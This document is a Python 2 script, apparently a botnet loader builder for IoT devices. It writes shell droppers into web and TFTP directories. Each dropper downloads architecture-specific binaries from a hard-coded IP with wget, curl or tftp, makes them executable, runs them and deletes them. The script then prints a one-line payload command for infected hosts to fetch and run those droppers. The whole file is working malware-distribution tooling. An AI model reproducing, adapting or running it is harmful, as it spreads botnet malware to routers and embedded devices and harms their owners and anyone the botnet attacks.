import subprocess, sys, urllib

if len(sys.argv) < 4:
    print "Usage: python "+sys.argv[0]+ " <name> <is bin directory> </var/lib/tftpboot/?>"
    sys.exit(2)

ip = "46.249.32.109"
exec_name = sys.argv[1]

is_bin_dir_str = sys.argv[2]
is_bin_dir = -1
is_tftp_dir_str = sys.argv[3]
is_tftp_dir = -1

bin_prefix = "FBI." 
bin_directory = ""

archs = ["i486", "x86_64", "i586", "i686",              
"mips",                       
"mipsel",                       
"arm", # arm4                       
"arm5",                       
"arm6",                       
"arm7",                       
"ppc",                        
"m68k",                       
"sh4"]

if is_bin_dir_str == "y" or is_bin_dir_str == "Y":
    is_bin_dir = 1
elif is_bin_dir_str == "n" or is_bin_dir_str == "N":
    is_bin_dir = 0
else:
    sys.exit("2nd argument needs to be Y/n")

if is_tftp_dir_str == "y" or is_tftp_dir_str == "Y":
    is_tftp_dir = 1
elif is_tftp_dir_str == "n" or is_tftp_dir_str == "N":
    is_tftp_dir = 0
else:
    sys.exit("3nd argument needs to be Y/n")

def run(cmd):
    subprocess.call(cmd, shell=True)
print("\033[38;5;202mCompiling\033[1;37m...")
print(" ")
run('rm -rf /var/www/html/'+exec_name+'.sh')
if is_tftp_dir == 1:
    run('rm -rf /var/lib/tftpboot/'+exec_name+'1.sh /var/lib/tftpboot/'+exec_name+'2.sh')
else:
    run('rm -rf /tftpboot/'+exec_name+'1.sh /tftpboot/'+exec_name+'2.sh')
run('echo "#!/bin/bash" > /var/www/html/'+exec_name+'.sh')
run('echo "ulimit -n 1024" >> /var/www/html/'+exec_name+'.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/www/html/'+exec_name+'.sh')
if is_tftp_dir == 1:
    run('echo "#!/bin/bash" > /var/lib/tftpboot/'+exec_name+'1.sh')
    run('echo "ulimit -n 1024" >> /var/lib/tftpboot/'+exec_name+'1.sh')
    run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/'+exec_name+'1.sh')
    run('echo "#!/bin/bash" > /var/lib/tftpboot/'+exec_name+'2.sh')
    run('echo "ulimit -n 1024" >> /var/lib/tftpboot/'+exec_name+'2.sh')
    run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/'+exec_name+'2.sh')
else:
    run('echo "#!/bin/bash" > /tftpboot/'+exec_name+'1.sh')
    run('echo "ulimit -n 1024" >> /tftpboot/'+exec_name+'1.sh')
    run('echo "cp /bin/busybox /tmp/" >> /tftpboot/'+exec_name+'1.sh')
    run('echo "#!/bin/bash" > /tftpboot/'+exec_name+'2.sh')
    run('echo "ulimit -n 1024" >> /tftpboot/'+exec_name+'2.sh')
    run('echo "cp /bin/busybox /tmp/" >> /tftpboot/'+exec_name+'2.sh')
for i in archs:
    if is_bin_dir == 1:
        run('echo "cd /tmp; wget http://' + ip + '/' + bin_directory+bin_prefix+i + '; curl -O http://' + ip + '/' + bin_directory+bin_prefix+i + '; chmod 777 ' + bin_prefix+i + '; ./' + bin_prefix+i + ' ' + exec_name + '.' + i + '.wget; rm -rf ' + bin_prefix+i + '" >> /var/www/html/'+exec_name+'.sh')
    else:
        run('echo "cd /tmp; wget http://' + ip + '/' + bin_prefix+i + '; curl -O http://' + ip + '/' + bin_prefix+i + '; chmod 777 ' + bin_prefix+i + '; ./' + bin_prefix+i + ' ' + exec_name + '.' + i + '.wget; rm -rf ' + bin_prefix+i + '" >> /var/www/html/'+exec_name+'.sh')    
    if is_tftp_dir == 1:
        run('echo "cd /tmp; tftp ' + ip + ' -c get ' + bin_prefix+i + '; chmod 777 *; ./' + bin_prefix+i + ' ' + exec_name + '.' + i + '.tftp" >> /var/lib/tftpboot/'+exec_name+'1.sh')
        run('echo "cd /tmp; tftp -r ' + bin_prefix+i + ' -g ' + ip + '; chmod 777 *; ./' + bin_prefix+i + ' ' + exec_name + '.' + i + '.tftp2" >> /var/lib/tftpboot/'+exec_name+'2.sh')
    else:
        run('echo "cd /tmp; tftp ' + ip + ' -c get ' + bin_prefix+i + '; chmod 777 *; ./' + bin_prefix+i + ' ' + exec_name + '.' + i + '.tftp" >> /tftpboot/'+exec_name+'1.sh')
        run('echo "cd /tmp; tftp -r ' + bin_prefix+i + ' -g ' + ip + '; chmod 777 *; ./' + bin_prefix+i + ' ' + exec_name + '.' + i + '.tftp2" >> /tftpboot/'+exec_name+'2.sh')
print("\x1b[1;37mPayload: \033[38;5;202mcd /tmp; wget http://" + ip + "/" + exec_name + ".sh; curl -O http://" + ip + "/" + exec_name + ".sh; chmod 777 " + exec_name + ".sh; sh " + exec_name + ".sh; tftp " + ip + " -c get " + exec_name + "1.sh; chmod 777 " + exec_name + "1.sh; sh " + exec_name + "1.sh; tftp -r " + exec_name + "2.sh -g " + ip + "; chmod 777 " + exec_name + "2.sh; sh " + exec_name + "2.sh; rm -rf " + exec_name + ".sh " + exec_name + "1.sh " + exec_name + "2.sh")
print("\033[38;5;202mExporting to payload.txt\033[1;37m...")
f = open("payload.txt","w+")

f.close()
raw_input("\x1b[1;37mDone\033[38;5;202m!")

